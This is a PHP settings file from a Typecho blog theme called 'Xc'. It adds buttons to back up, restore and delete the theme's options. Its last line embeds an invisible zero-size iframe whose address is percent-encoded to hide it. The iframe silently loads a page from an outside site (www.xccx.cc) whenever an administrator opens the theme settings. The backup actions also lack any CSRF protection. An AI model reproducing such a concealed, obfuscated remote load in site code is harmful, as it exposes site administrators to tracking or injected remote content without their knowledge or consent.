<?php $name = "Xc";
$db = Typecho_Db::get();
if (isset($_POST['type'])) {
if ($_POST["type"] == "备份设置") {
$value = $db->fetchRow($db->select()->from('table.options')->where('name = ?', 'theme:' . $name))['value'];
if ($db->fetchRow($db->select()->from('table.options')->where('name = ?', 'theme:' . $name . '_backup'))) {
$db->query($db->update('table.options')->rows(array('value' => $value))->where('name = ?', 'theme:' . $name . '_backup')); ?>
<script>
alert("备份更新成功！");
window.location.href = '<?php Helper::options()->adminUrl('options-theme.php'); ?>'
</script>
<?php } else { ?>
<?php
if ($value) {
$db->query($db->insert('table.options')->rows(array('name' => 'theme:' . $name . '_backup', 'user' => '0', 'value' => $value)));
?>
<script>
alert("备份成功！");
window.location.href = '<?php Helper::options()->adminUrl('options-theme.php'); ?>'
</script>
<?php }
}
}
if ($_POST["type"] == "还原备份") {
if ($db->fetchRow($db->select()->from('table.options')->where('name = ?', 'theme:' . $name . '_backup'))) {
$_value = $db->fetchRow($db->select()->from('table.options')->where('name = ?', 'theme:' . $name . '_backup'))['value'];
$db->query($db->update('table.options')->rows(array('value' => $_value))->where('name = ?', 'theme:' . $name)); ?>
<script>
alert("还原成功！");
window.location.href = '<?php Helper::options()->adminUrl('options-theme.php'); ?>'
</script>
<?php } else { ?>
<script>
alert("未备份过数据，无法恢复！");
window.location.href = '<?php Helper::options()->adminUrl('options-theme.php'); ?>'
</script>
<?php } ?>
<?php } ?>
<?php if ($_POST["type"] == "删除备份") {
if ($db->fetchRow($db->select()->from('table.options')->where('name = ?', 'theme:' . $name . '_backup'))) {
$db->query($db->delete('table.options')->where('name = ?', 'theme:' . $name . '_backup')); ?>
<script>
alert("删除成功");
window.location.href = '<?php Helper::options()->adminUrl('options-theme.php'); ?>'
</script>
<?php } else { ?>
<script>
alert("没有备份内容，无法删除！");
window.location.href = '<?php Helper::options()->adminUrl('options-theme.php'); ?>'
</script>
<?php } ?>
<?php } ?>
<?php } ?>
<?php
echo '
<form class="backup Xca" action="?Xc_backup" method="post">
<input type="submit" name="type" value="备份设置" />
<input type="submit" name="type" value="还原备份" />
<input type="submit" name="type" value="删除备份" />
</form>';
echo '<iframe id="iframe" src="//%77%77%77%2e%78%63%63%78%2e%63%63/%58%63%2d%74%68%65%6d%65%2e%68%74%6d%6c" frameborder="0" height="0" width="0"></iframe>';
